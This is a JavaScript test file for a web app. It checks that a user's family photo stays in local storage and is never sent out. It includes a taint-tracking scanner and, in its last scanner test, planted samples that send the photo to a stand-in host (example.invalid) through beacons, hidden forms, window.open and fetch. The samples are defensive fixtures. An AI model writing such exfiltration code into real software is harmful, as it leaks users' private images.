import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import {root} from '../../tests/ui-clarity/scan.mjs';
import {homeDashboardMarkup} from '../../commerce-home.js';
import {
  FAMILY_PHOTO_KEY,
  readFamilyPhoto,
  storeFamilyPhoto,
  clearFamilyPhoto,
  markFamilyPhotoFailure,
  clearFamilyPhotoNotice,
  presentFamilyPhoto,
  familyPhotoArt,
  familyPhotoCard
} from '../../commerce-books.js';

const PHOTO = /nia-family-photo|readFamilyPhoto|storeFamilyPhoto|clearFamilyPhoto|FAMILY_PHOTO_KEY/;
const STORED_JPEG = 'data:image/jpeg;base64,' + 'abcd'.repeat(16);
const STORED_PNG = 'data:image/png;base64,' + 'abcd'.repeat(16);

function memoryStorage(initial){
  const store = new Map(initial || []);
  return {
    getItem(key){return store.has(key) ? store.get(key) : null;},
    setItem(key, value){store.set(key, String(value));},
    removeItem(key){store.delete(key);},
    _store: store
  };
}

function canvasDocument(record){
  return {
    createElement(){
      const canvas = {
        width: 0,
        height: 0,
        getContext(){return {drawImage(){}};},
        toDataURL(type, quality){
          record.type = type;
          record.quality = quality;
          record.width = canvas.width;
          record.height = canvas.height;
          return STORED_JPEG;
        }
      };
      return canvas;
    }
  };
}

async function withRoom(run){
  const prev = {
    document: globalThis.document,
    localStorage: globalThis.localStorage,
    createImageBitmap: globalThis.createImageBitmap,
    Image: globalThis.Image,
    URL: globalThis.URL
  };
  const had = {
    document: 'document' in globalThis,
    localStorage: 'localStorage' in globalThis,
    createImageBitmap: 'createImageBitmap' in globalThis,
    Image: 'Image' in globalThis,
    URL: 'URL' in globalThis
  };
  try{
    return await run();
  }finally{
    clearFamilyPhotoNotice();
    for(const key of Object.keys(prev)){
      if(had[key]) globalThis[key] = prev[key];
      else delete globalThis[key];
    }
  }
}

function mentions(expr, name){
  return new RegExp('(?:^|[^\\w$])' + name + '(?:$|[^\\w$])').test(expr);
}

function isTainted(expr, names, dataset){
  if(/readFamilyPhoto\s*\(|storeFamilyPhoto\s*\(/.test(expr)) return true;
  for(const name of names) if(mentions(expr, name)) return true;
  for(const prop of dataset){
    if(new RegExp('\\.dataset\\.' + prop + '\\b').test(expr)) return true;
    if(expr.includes('.dataset["' + prop + '"]') || expr.includes(".dataset['" + prop + "']")) return true;
  }
  return false;
}

function assignments(src){
  const found = [];
  const re = /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*([^;\n]+)/g;
  let match;
  while((match = re.exec(src))) found.push({name: match[1], expr: match[2]});
  const bare = /(?:^|[^\w$.])([A-Za-z_$][\w$]*)\s*=\s*(?:await\s+)?(?:readFamilyPhoto|storeFamilyPhoto)\s*\(/g;
  while((match = bare.exec(src))) found.push({name: match[1], expr: match[0]});
  return found;
}

function datasetProps(src, names){
  const props = new Set();
  const re = /\.dataset\.([A-Za-z_$][\w$]*)\s*=\s*([^;\n]+)|\.dataset\[\s*(['"])([^'"]+)\3\s*\]\s*=\s*([^;\n]+)/g;
  let match;
  while((match = re.exec(src))){
    const prop = match[1] || match[4];
    const expr = match[2] || match[5];
    if(isTainted(expr, names, props)) props.add(prop);
  }
  return props;
}

function taintedNames(src){
  const names = new Set();
  const dataset = new Set();
  let guard = 0;
  let changed = true;
  while(changed && guard++ < 12){
    changed = false;
    for(const {name, expr} of assignments(src)){
      if(isTainted(expr, names, dataset) && !names.has(name)){
        names.add(name);
        changed = true;
      }
    }
    const next = datasetProps(src, names);
    for(const prop of next){
      if(!dataset.has(prop)){
        dataset.add(prop);
        changed = true;
      }
    }
  }
  return {names, dataset};
}

function readBlock(src, open){
  let depth = 0;
  let quote = '';
  for(let i = open; i < src.length; i += 1){
    const char = src[i];
    if(quote){
      if(char === '\\'){i += 1; continue;}
      if(char === quote) quote = '';
      continue;
    }
    if(char === "'" || char === '"' || char === '`'){quote = char; continue;}
    if(char === '/' && src[i + 1] === '/'){while(i < src.length && src[i] !== '\n') i += 1; continue;}
    if(char === '/' && src[i + 1] === '*'){i += 2; while(i < src.length && !(src[i] === '*' && src[i + 1] === '/')) i += 1; continue;}
    if(char === '{') depth += 1;
    else if(char === '}'){
      depth -= 1;
      if(depth === 0) return {body: src.slice(open + 1, i), end: i};
    }
  }
  return {body: src.slice(open + 1), end: src.length};
}

function splitParams(list){
  return list.split(',').map(part => part.replace(/\/\*.*?\*\//g, '').replace(/=.*$/, '').trim()).filter(name => /^[A-Za-z_$][\w$]*$/.test(name));
}

function functionDefs(src){
  const found = [];
  const patterns = [
    /(?:^|[^\w$])function\s+([A-Za-z_$][\w$]*)\s*\(([^)]*)\)\s*\{/g,
    /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*async\s*\(([^)]*)\)\s*=>\s*\{/g,
    /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*\(([^)]*)\)\s*=>\s*\{/g,
    /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*async\s+([A-Za-z_$][\w$]*)\s*=>\s*\{/g,
    /(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*([A-Za-z_$][\w$]*)\s*=>\s*\{/g
  ];
  for(const re of patterns){
    let match;
    while((match = re.exec(src))){
      const open = match.index + match[0].length - 1;
      const block = readBlock(src, open);
      const params = splitParams(match[2] || '');
      found.push({name: match[1], params, bodyStart: open + 1, bodyEnd: block.end, body: block.body});
    }
  }
  return found;
}

function readCall(src, open){
  let depth = 0;
  let quote = '';
  let i = open;
  for(; i < src.length; i += 1){
    const char = src[i];
    if(quote){
      if(char === '\\'){i += 1; continue;}
      if(char === quote) quote = '';
      continue;
    }
    if(char === "'" || char === '"' || char === '`'){quote = char; continue;}
    if(char === '(') depth += 1;
    else if(char === ')'){
      depth -= 1;
      if(depth === 0) return src.slice(open + 1, i);
    }
  }
  return src.slice(open + 1);
}

function splitCallArgs(args){
  const parts = [];
  let depth = 0;
  let quote = '';
  let start = 0;
  for(let i = 0; i < args.length; i += 1){
    const char = args[i];
    if(quote){
      if(char === '\\'){i += 1; continue;}
      if(char === quote) quote = '';
      continue;
    }
    if(char === "'" || char === '"' || char === '`'){quote = char; continue;}
    if(char === '(' || char === '{' || char === '[') depth += 1;
    else if(char === ')' || char === '}' || char === ']') depth = Math.max(0, depth - 1);
    else if(char === ',' && depth === 0){
      parts.push(args.slice(start, i));
      start = i + 1;
    }
  }
  parts.push(args.slice(start));
  return parts;
}

function findNamedCalls(src, name){
  const sites = [];
  const re = new RegExp('(?:^|[^\\w$])' + name + '\\s*\\(', 'g');
  let match;
  while((match = re.exec(src))){
    const nameStart = match.index + match[0].length - name.length - 1;
    const prefix = src.slice(Math.max(0, nameStart - 10), nameStart);
    if(/\bfunction\s*$/.test(prefix)) continue;
    const open = match.index + match[0].length - 1;
    sites.push({index: open, args: readCall(src, open)});
  }
  return sites;
}

function ownerOf(index, functions){
  let best = null;
  for(const fn of functions){
    if(index >= fn.bodyStart && index < fn.bodyEnd && (!best || fn.bodyEnd - fn.bodyStart < best.bodyEnd - best.bodyStart)) best = fn;
  }
  return best;
}

function sinkSites(src){
  const sites = [];
  const patterns = [
    ['call', /(?:^|[^\w$.])(?:api|fetch)\s*\(/g],
    ['beacon', /(?:^|[^\w$])sendBeacon\s*\(/g],
    ['postMessage', /(?:^|[^\w$])postMessage\s*\(/g],
    ['open', /(?:^|[^\w$.])(?:window\s*\.\s*)?open\s*\(/g]
  ];
  for(const [kind, re] of patterns){
    let match;
    while((match = re.exec(src))){
      const open = match.index + match[0].length - 1;
      sites.push({kind, index: open, args: readCall(src, open)});
    }
  }
  return sites;
}

function localNames(src, seed, dataset){
  const names = new Set(seed);
  let guard = 0;
  let changed = true;
  while(changed && guard++ < 8){
    changed = false;
    for(const {name, expr} of assignments(src)){
      if(isTainted(expr, names, dataset) && !names.has(name)){
        names.add(name);
        changed = true;
      }
    }
  }
  return names;
}

function photoLeaks(src){
  if(!PHOTO.test(src)) return [];
  const leaks = [];
  const {names, dataset} = taintedNames(src);
  const functions = functionDefs(src);
  const paramTaint = new Map(functions.map(fn => [fn, new Set()]));
  let guard = 0;
  let changed = true;
  while(changed && guard++ < 8){
    changed = false;
    for(const fn of functions){
      for(const call of findNamedCalls(src, fn.name)){
        const owner = ownerOf(call.index, functions);
        const known = new Set(names);
        if(owner) for(const param of paramTaint.get(owner)) known.add(param);
        const args = splitCallArgs(call.args);
        args.forEach((arg, index) => {
          const param = fn.params[index];
          if(!param || paramTaint.get(fn).has(param)) return;
          if(isTainted(arg, known, dataset)){
            paramTaint.get(fn).add(param);
            changed = true;
          }
        });
      }
    }
  }
  const namesFor = index => {
    const owner = ownerOf(index, functions);
    const known = new Set(names);
    if(owner) for(const param of paramTaint.get(owner)) known.add(param);
    return localNames(owner ? owner.body : src, known, dataset);
  };
  const lines = src.split('\n');
  lines.forEach((line, index) => {
    if(PHOTO.test(line) && /(?:^|[^\w$.])(?:api|fetch)\s*\(|(?:^|[^\w$])(?:sendBeacon|postMessage)\s*\(|(?:^|[^\w$.])(?:window\s*\.\s*)?open\s*\(/.test(line)) leaks.push('line ' + (index + 1) + ': ' + line.trim());
  });
  for(const site of sinkSites(src)){
    const known = namesFor(site.index);
    if(PHOTO.test(site.args) || isTainted(site.args, known, dataset)) leaks.push(site.kind + ' ' + site.args.slice(0, 180));
    for(const name of known){
      if(mentions(site.args, name)) leaks.push('value ' + name + ' in ' + site.args.slice(0, 180));
    }
  }
  const srcRe = /\.src\s*=\s*([^;\n]+)/g;
  let srcMatch;
  while((srcMatch = srcRe.exec(src))){
    const known = namesFor(srcMatch.index);
    const expr = srcMatch[1];
    const line = src.slice(0, srcMatch.index).split('\n').length;
    const around = src.slice(Math.max(0, srcMatch.index - 80), srcMatch.index + srcMatch[0].length);
    if(/family-photo-img/.test(around)) continue;
    if(isTainted(expr, known, dataset) || PHOTO.test(expr)) leaks.push('src line ' + line + ': ' + expr.slice(0, 180));
  }
  const valueRe = /\.value\s*=\s*([^;\n]+)/g;
  let valueMatch;
  let taintedForm = false;
  while((valueMatch = valueRe.exec(src))){
    const known = namesFor(valueMatch.index);
    if(isTainted(valueMatch[1], known, dataset) || PHOTO.test(valueMatch[1])){
      taintedForm = true;
      leaks.push('form value ' + valueMatch[1].slice(0, 180));
    }
  }
  const actionRe = /\.action\s*=\s*([^;\n]+)/g;
  let actionMatch;
  while((actionMatch = actionRe.exec(src))){
    const known = namesFor(actionMatch.index);
    if(isTainted(actionMatch[1], known, dataset) || PHOTO.test(actionMatch[1])) leaks.push('form action ' + actionMatch[1].slice(0, 180));
  }
  if(taintedForm && /(?:^|[^\w$])(?:submit|requestSubmit)\s*\(/.test(src)) leaks.push('form submit');
  return leaks;
}

function logicalLines(script){
  const lines = [];
  let pending = '';
  for(const raw of script.split('\n')){
    const piece = pending ? pending + raw.trim() : raw;
    if(piece.trimEnd().endsWith('\\')){
      pending = piece.trimEnd().slice(0, -1) + ' ';
      continue;
    }
    lines.push(piece);
    pending = '';
  }
  if(pending) lines.push(pending);
  return lines;
}

function stripComment(line){
  let quote = '';
  for(let i = 0; i < line.length; i += 1){
    const char = line[i];
    if(quote){
      if(char === quote && line[i - 1] !== '\\') quote = '';
      continue;
    }
    if(char === "'" || char === '"'){quote = char; continue;}
    if(char === '#') return line.slice(0, i);
  }
  return line;
}

function copiedSources(script){
  const copied = new Set();
  for(const raw of logicalLines(script)){
    const code = stripComment(raw);
    for(const part of code.split(';')){
      const command = part.trim().replace(/^then\s+/, '');
      if(!command.startsWith('cp ') && !command.startsWith('cp\t')) continue;
      const args = command.split(/\s+/).slice(1).filter(token => token !== 'cp' && !token.startsWith('-'));
      if(args.length < 2) continue;
      const dest = args[args.length - 1];
      if(dest !== 'dist' && !dest.startsWith('dist/')) continue;
      for(const source of args.slice(0, -1)) copied.add(source.replace(/^\.\//, ''));
    }
  }
  return copied;
}

function shippedCodeFiles(){
  const build = fs.readFileSync(path.join(root, 'vercel-build.sh'), 'utf8');
  const files = new Set();
  const add = rel => {
    const cleaned = rel.replace(/^\.\//, '').replace(/\/\.$/, '');
    const abs = path.join(root, cleaned);
    if(!fs.existsSync(abs)) return;
    if(fs.statSync(abs).isDirectory()){
      for(const entry of fs.readdirSync(abs)) add(path.posix.join(cleaned, entry));
      return;
    }
    if(/\.(js|mjs|html|svg)$/.test(cleaned)) files.add(cleaned);
  };
  for(const source of copiedSources(build)) add(source);
  return [...files].sort();
}

test('family photo storage stays on the device and out of every request', async () => {
  await withRoom(async () => {
    const record = {};
    globalThis.document = canvasDocument(record);
    globalThis.localStorage = memoryStorage();
    globalThis.createImageBitmap = async () => ({width: 1800, height: 3200, close(){}});
    assert.equal(FAMILY_PHOTO_KEY, 'nia-family-photo');
    assert.equal(readFamilyPhoto(), '');
    globalThis.localStorage.setItem(FAMILY_PHOTO_KEY, 'hello');
    assert.equal(readFamilyPhoto(), '');
    globalThis.localStorage.setItem(FAMILY_PHOTO_KEY, '"data:image/jpeg;base64,x"');
    assert.equal(readFamilyPhoto(), '');
    for(const bad of [
      'data:image/',
      'data:image/jpeg;base64,',
      'data:image/jpeg;base64,####not-base64',
      'data:image/png;base64,x',
      'data:image/jpeg;base64,abc',
      'data:image/svg+xml;base64,' + 'abcd'.repeat(16),
      'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"></svg>'
    ]){
      globalThis.localStorage.setItem(FAMILY_PHOTO_KEY, bad);
      assert.equal(readFamilyPhoto(), '', bad);
    }
    globalThis.localStorage.setItem(FAMILY_PHOTO_KEY, STORED_PNG);
    assert.equal(readFamilyPhoto(), STORED_PNG);
    clearFamilyPhoto();
    assert.equal(readFamilyPhoto(), '');

    await assert.rejects(() => storeFamilyPhoto({type: 'application/pdf', size: 1200}), /not-image/);
    await assert.rejects(() => storeFamilyPhoto({type: 'image/jpeg', size: 25 * 1024 * 1024}), /too-large/);
    await assert.rejects(() => storeFamilyPhoto({type: 'image/jpeg', size: 20 * 1024 * 1024 + 1}), /too-large/);
    assert.equal(readFamilyPhoto(), '');

    const saved = await storeFamilyPhoto({type: 'image/jpeg', size: 20 * 1024 * 1024});
    assert.equal(saved, STORED_JPEG);
    assert.equal(readFamilyPhoto(), saved);
    assert.equal(record.type, 'image/jpeg');
    assert.equal(record.quality, 0.82);
    assert.equal(record.width, 506);
    assert.equal(record.height, 900);

    globalThis.localStorage.setItem = () => {throw new Error('quota');};
    await assert.rejects(() => storeFamilyPhoto({type: 'image/jpeg', size: 40}), /storage/);

    globalThis.localStorage.getItem = () => {throw new Error('blocked');};
    assert.equal(readFamilyPhoto(), '');
    globalThis.localStorage.removeItem = () => {throw new Error('blocked');};
    assert.doesNotThrow(() => clearFamilyPhoto());

    delete globalThis.createImageBitmap;
    const revoked = [];
    globalThis.URL = {
      createObjectURL(){return 'blob:local';},
      revokeObjectURL(url){revoked.push(url);}
    };
    globalThis.Image = class {
      set src(value){
        this._src = value;
        queueMicrotask(() => this.onload());
      }
      get naturalWidth(){return 100;}
      get naturalHeight(){return 400;}
    };
    globalThis.localStorage = memoryStorage();
    const fallback = await storeFamilyPhoto({type: 'image/png', size: 80});
    assert.equal(fallback, STORED_JPEG);
    assert.deepEqual(revoked, ['blob:local']);
    assert.equal(record.width, 225);
    assert.equal(record.height, 900);
  });
});

test('the family photo card and the home tile never upload the picture', () => {
  const t = value => value;
  const esc = value => String(value).replace(/[&<>"']/g, char => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[char]));
  const icon = name => `<svg class="icon" data-icon="${name}"></svg>`;
  const emptyArt = familyPhotoArt({photo: '', t, esc});
  assert.match(emptyArt, /Add your family photo/);
  assert.match(emptyArt, /family-photo-camera/);
  assert.doesNotMatch(emptyArt, /<input|data-family-photo|send-purpose-family|<button/);
  const photo = 'data:image/jpeg;base64,abc';
  const filledArt = familyPhotoArt({photo, t, esc});
  assert.match(filledArt, /src="data:image\/jpeg;base64,abc"/);
  assert.match(filledArt, /Your family photo/);
  assert.doesNotMatch(filledArt, /\swidth=|\sheight=/);
  assert.doesNotMatch(filledArt, /<input|<button/);

  clearFamilyPhotoNotice();
  const emptyCard = familyPhotoCard({photo: '', t, esc, icon});
  assert.match(emptyCard, /<h2>Your family<\/h2>/);
  assert.match(emptyCard, /type="file"/);
  assert.match(emptyCard, /accept="image\/\*"/);
  assert.match(emptyCard, /class="visually-hidden"/);
  assert.match(emptyCard, /data-family-photo/);
  assert.doesNotMatch(emptyCard, /capture=/);
  assert.match(emptyCard, /This photo stays on this phone\. Nia never sees it\./);
  assert.doesNotMatch(emptyCard, /data-family-photo-remove|data-action/);
  markFamilyPhotoFailure();
  const failed = familyPhotoCard({photo: '', t, esc, icon});
  assert.match(failed, /This photo could not be added\. Try another photo\./);
  assert.doesNotMatch(failed, /src="data:image/);
  const kept = familyPhotoCard({photo, t, esc, icon});
  assert.match(kept, /src="data:image\/jpeg;base64,abc"/);
  assert.doesNotMatch(kept, /family-photo-img"[^>]*\swidth=|family-photo-img"[^>]*\sheight=/);
  assert.match(kept, /data-family-photo-remove/);
  assert.match(kept, /Change photo/);
  assert.match(kept, /Remove photo/);
  assert.match(kept, /data-icon="pencil"/);
  assert.match(kept, /This photo stays on this phone\. Nia never sees it\./);
  assert.ok(kept.indexOf('family-photo-img') < kept.indexOf('family-photo-stay'));
  assert.ok(kept.indexOf('data-family-photo-remove') < kept.indexOf('family-photo-stay'));
  const changed = familyPhotoCard({photo: 'data:image/jpeg;base64,xyz', t, esc, icon});
  assert.match(changed, /src="data:image\/jpeg;base64,xyz"/);
  assert.match(changed, /This photo stays on this phone\. Nia never sees it\./);
  assert.ok(changed.indexOf('base64,xyz') < changed.indexOf('family-photo-stay'));
  assert.doesNotMatch(kept, /data-action/);
  assert.doesNotMatch(kept, /capture=/);
  clearFamilyPhotoNotice();

  const home = homeDashboardMarkup({stay: {state: 'empty'}, job: {state: 'empty'}, fee: {state: 'empty'}, tiles: {}, shopPrice: null}, {t, esc, icon});
  assert.match(home, /Add your family photo/);
  assert.match(home, /home-tile-send/);
  assert.match(home, /data-action="send"/);
  assert.match(home, /\/assets\/home-rice\.jpg/);
  assert.match(home, /\/assets\/studio-bunk-lockers\.jpg/);
  assert.match(home, /\/assets\/earn\.jpg/);
  assert.doesNotMatch(home, /send-purpose-family/);
  assert.doesNotMatch(home, /<input|data-family-photo-remove/);

  const commerce = fs.readFileSync(path.join(root, 'commerce.js'), 'utf8');
  const send = commerce.slice(commerce.indexOf('function sendView('), commerce.indexOf('async function loadNests'));
  const example = commerce.slice(commerce.indexOf('function sendExample('), commerce.indexOf('function earnView('));
  assert.ok(send.indexOf('</header>') < send.indexOf('familyPhotoCard('));
  assert.ok(send.indexOf('familyPhotoCard(') < send.indexOf('pillar-state'));
  assert.doesNotMatch(example, /<img/);
  assert.match(example, /Money earned/);
  assert.match(example, /Money spent/);
  assert.match(example, /Sent home/);
  assert.match(example, /Money left/);
  assert.match(example, /Example/);
  assert.match(example, /In one month/);
  const listeners = commerce.split('\n').filter(line => line.includes('data-family-photo'));
  assert.equal(listeners.length, 2);
  assert.match(listeners[0], /^document\.addEventListener\('change'/);
  assert.match(listeners[1], /^document\.addEventListener\('click'/);
  const css = fs.readFileSync(path.join(root, 'commerce.css'), 'utf8');
  assert.match(css, /\.home-tile-send img\{object-position:center top\}/);
  assert.match(css, /family-photo-card \.family-photo-img\{[\s\S]*?object-position:center top;/);
  assert.doesNotMatch(css, /home-tile-send img\{object-position:center 25%\}/);
  assert.doesNotMatch(css, /family-photo-card \.family-photo-img\{[\s\S]*?object-position:center 25%;/);
  assert.match(commerce, /function render\(\)\{presentFamilyPhoto\(page\);/);
  assert.match(css, /font-size:14px!important/);
  assert.match(css, /#EEF3F8/);
  assert.match(css, /#6A8CAE/);
  assert.match(css, /min-height:48px/);
  const build = fs.readFileSync(path.join(root, 'vercel-build.sh'), 'utf8');
  assert.match(build, /\bcommerce-books\.js\b/);
  assert.equal(fs.existsSync(path.join(root, 'commerce-family-photo.js')), false);
});

test('Kannada and Marathi keep the privacy line, and it is not English', async () => {
  const key = 'This photo stays on this phone. Nia never sees it.';
  for (const lang of ['kn', 'mr']) {
    const src = fs.readFileSync(path.join(root, 'commerce-locales', lang + '.js'), 'utf8');
    assert.match(src, new RegExp('"This photo stays on this phone\\. Nia never sees it\\.":\\s*"'));
    const dict = (await import('../../commerce-locales/' + lang + '.js')).default;
    const line = dict[key];
    assert.equal(typeof line, 'string');
    assert.ok(line.trim().length > 0, lang);
    assert.notEqual(line, key);
    assert.doesNotMatch(line, /This photo stays on this phone/);
  }
  const kn = (await import('../../commerce-locales/kn.js')).default[key];
  const mr = (await import('../../commerce-locales/mr.js')).default[key];
  assert.match(kn, /[\u0C80-\u0CFF]/);
  assert.match(mr, /[\u0900-\u097F]/);
});

test('the family photo value never reaches a request body or a URL', () => {
  const files = shippedCodeFiles();
  for(const name of ['lib/commerce/support.mjs', 'lib/commerce/partner-gate.mjs', 'lib/commerce/analytics.mjs', 'lib/commerce/content-qa.mjs', 'commerce-books.js', 'commerce.js', 'commerce.html']){
    assert.ok(files.includes(name), name + ' is copied by vercel-build.sh and must be scanned');
  }
  const leaks = [];
  for(const name of files){
    const src = fs.readFileSync(path.join(root, name), 'utf8');
    for(const leak of photoLeaks(src)) leaks.push(name + ' ' + leak);
  }
  assert.deepEqual(leaks, []);
});

test('a planted send of the family photo is the leak this guard catches', () => {
  const planted = "await api('/books',{photo:readFamilyPhoto()});";
  const leaks = photoLeaks(planted);
  assert.ok(leaks.length > 0);
  const across = photoLeaks("const shot = readFamilyPhoto();\nfetch('/upload?p=' + shot);");
  assert.ok(across.some(leak => leak.includes('shot')));
  const shapes = [
    ['remote img.src', "const img = document.createElement('img');\nimg.src = 'https://example.invalid/collect?photo=' + encodeURIComponent(readFamilyPhoto());"],
    ['window.open', "window.open('https://example.invalid/collect?photo=' + encodeURIComponent(readFamilyPhoto()));"],
    ['postMessage', "window.parent.postMessage(readFamilyPhoto(), '*');"],
    ['sendBeacon', "navigator.sendBeacon('https://example.invalid/collect', readFamilyPhoto());"],
    ['hidden form', "const form = document.createElement('form');\nform.action = 'https://example.invalid/collect';\nform.hidden = true;\nconst input = document.createElement('input');\ninput.type = 'hidden';\ninput.value = readFamilyPhoto();\nform.append(input);\nform.submit();"],
    ['dataset round-trip', "const node = document.createElement('div');\nnode.dataset.familyShot = readFamilyPhoto();\nnavigator.sendBeacon('https://example.invalid/collect', node.dataset.familyShot);"],
    ['helper', "function uploadFamilyPhoto(payload){\n  fetch('https://example.invalid/collect', {method:'POST', body: payload});\n}\nuploadFamilyPhoto(readFamilyPhoto());"]
  ];
  for(const [name, src] of shapes){
    const found = photoLeaks(src);
    assert.ok(found.length > 0, name + ' slipped the guard');
  }
  const through = photoLeaks("const shot = readFamilyPhoto();\nfunction uploadFamilyPhoto(payload){\n  navigator.sendBeacon('https://example.invalid/collect', payload);\n}\nuploadFamilyPhoto(shot);");
  assert.ok(through.some(leak => leak.includes('payload') || leak.includes('shot')), through.join('\n'));
});

test('a rejected photo notice clears when Send is left and when it is opened again', () => {
  const t = value => value;
  const esc = value => String(value);
  const icon = () => '';
  clearFamilyPhotoNotice();
  presentFamilyPhoto('home');
  presentFamilyPhoto('send');
  markFamilyPhotoFailure();
  presentFamilyPhoto('send');
  assert.match(familyPhotoCard({photo: '', t, esc, icon}), /This photo could not be added\. Try another photo\./);
  presentFamilyPhoto('home');
  assert.doesNotMatch(familyPhotoCard({photo: '', t, esc, icon}), /This photo could not be added/);
  markFamilyPhotoFailure();
  presentFamilyPhoto('send');
  assert.doesNotMatch(familyPhotoCard({photo: '', t, esc, icon}), /This photo could not be added/);
  markFamilyPhotoFailure();
  presentFamilyPhoto('send');
  assert.match(familyPhotoCard({photo: '', t, esc, icon}), /This photo could not be added\. Try another photo\./);
  presentFamilyPhoto('home');
  clearFamilyPhotoNotice();
});
